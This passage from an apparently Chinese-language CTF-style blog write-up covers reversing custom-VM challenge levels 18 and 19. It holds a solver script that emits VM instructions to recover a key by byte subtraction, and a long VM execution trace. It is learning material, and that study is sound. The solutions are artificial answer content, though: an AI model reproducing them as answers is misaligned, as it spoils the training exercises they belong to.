class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs routeros">imm(0x20, 0x4D)<br>imm(0x40, 9)<br>imm(2, 0)<br><span class="hljs-comment"># sys(2, 2)</span><br>imm(0x20, 0x6D)             # 0x20 b<br>imm(0x40, 1)                # 0x40 c<br>imm(2, 0x81)                # 0x02 a        0x10 d      0x01 s      0x04 i      0x08 f<br>stm(0x20, 2)                # [s] STM <span class="hljs-number">*b</span> = a<br><span class="hljs-built_in">add</span>(0x20, 0x40)             # [s] <span class="hljs-built_in">ADD</span> b c<br>imm(2, 0xEA)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x34)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xDE)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xF2)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x1D)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xE)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0x49)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)<br>imm(2, 0xE1)<br>stm(0x20, 2)<br><span class="hljs-built_in">add</span>(0x20, 0x40)         # [s] <span class="hljs-built_in">ADD</span> b c<br>imm(0x20, 0x6D)         # [s] IMM b = 0x6d<br>ldm(32, 32)             # [s] LDM b = <span class="hljs-number">*b</span><br>imm(2, 0x4D)            # [s] IMM a = 0x4d<br>ldm(2, 2)               # [s] IMM a = <span class="hljs-number">*a</span><br>imm(0x40, 0x2E)         # [s] IMM c = 0x2e<br><span class="hljs-built_in">add</span>(2, 0x40)            # [s] <span class="hljs-built_in">add</span> a c                        <br>imm(0x10, 1)            # [s] IMM d = 0x01<br>imm(1, 0x4D)            # [s] IMM s = 0x4d<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x6E)<br>ldm(32, 32)<br>imm(2, 0x4E)<br>ldm(2, 2)<br>imm(0x40, 0xA7)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x6F)<br>ldm(32, 32)<br>imm(2, 0x4F)<br>ldm(2, 2)<br>imm(0x40, 0x9E)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br>imm(0x20, 0x70)<br>ldm(32, 32)<br>imm(2, 0x50)<br>ldm(2, 2)<br>imm(0x40, 0x82)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x71)<br>ldm(32, 32)<br>imm(2, 0x51)<br>ldm(2, 2)<br>imm(0x40, 0x9D)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x72)<br>ldm(32, 32)<br>imm(2, 0x52)<br>ldm(2, 2)<br>imm(0x40, 0x89)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x73)<br>ldm(32, 32)<br>imm(2, 0x53)<br>ldm(2, 2)<br>imm(0x40, 0xDC)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x74)<br>ldm(32, 32)<br>imm(2, 0x54)<br>ldm(2, 2)<br>imm(0x40, 7)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br>imm(0x20, 0x75)<br>ldm(32, 32)<br>imm(2, 0x55)<br>ldm(2, 2)<br>imm(0x40, 0xA9)<br><span class="hljs-built_in">add</span>(2, 0x40)<br>stm(1, 2)               # [s] STM *s = a<br><span class="hljs-built_in">add</span>(1, 0x10)            # [s] <span class="hljs-built_in">add</span> s d<br><br><span class="hljs-comment"># cmp(2, 32)</span><br><span class="hljs-built_in">print</span>(a1[0x6d: 0x6d + 9])<br><span class="hljs-built_in">print</span>(a1[0x4d: 0x4d + 9])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    a1[i] = a1[0x6d + i] - a1[0x4d + i]<br><span class="hljs-built_in">print</span>(a1[:9])<br></code></pre></td></tr></table></figure>

<p>根据描述可以知道寄存器a，b，c，d，s，i，f分别是哪些16进制数代表的。所以就可以用上去，把中间值存起来，最后做一个减法就行了。</p>
<p>最后记得一点，就是有一个小于-128的负数，我们加上256，而不是加128。因为原本的数是因为大于256才溢出成为负数的。那么同理，减法也是减去256而不是128。</p>
<h4 id="level18-1"><a href="#level18-1" class="headerlink" title="level18.1"></a>level18.1</h4><p>从<code>a1[121]</code>接收用户输入，目标字符串在<code>a1[153]</code>；从逻辑上很容易看出来，这道题是在目标字符串上加了一个数。所以，这里我们需要修改上题的逻辑，把加之后的数据依然保存在原来的<code>a1[153]</code>开始的连续地址处就行了。最后再打印出来，转成字节序发送即可。</p>
<h4 id="level19-0"><a href="#level19-0" class="headerlink" title="level19.0"></a>level19.0</h4><p>原来，这里才开始是vmcode啊。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x52						<span class="hljs-comment">// opcode:0x20  IMM</span><br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x52<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x1						<span class="hljs-comment">// opcode:0x4	STK</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> d<br><span class="hljs-selector-attr">[s]</span> ... pushing d									<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x52 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x53 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x6a<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x6a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x54 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9c<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x55 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d										<span class="hljs-comment">// a1[0x9c] = 0x6a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x6a s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x56 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x39									<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9c d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x57 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9d<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x58 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d										<span class="hljs-comment">// a1[0x9d] = 0x39</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x59 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xf2<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xf2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9d d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>xf2 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x34<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x34<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9e d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x9f<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x9f<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x34 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x5f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x50<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x50<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>x9f d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x60 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa0<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa0<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x61 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x50 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x62 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x39<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa0 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x63 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa1<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x64 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x39 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x65 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x38<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x38<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa1 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x66 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa2<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa2<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x67 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>x38 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x68 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xbf<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xbf<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa2 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x69 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa3<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa3<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span 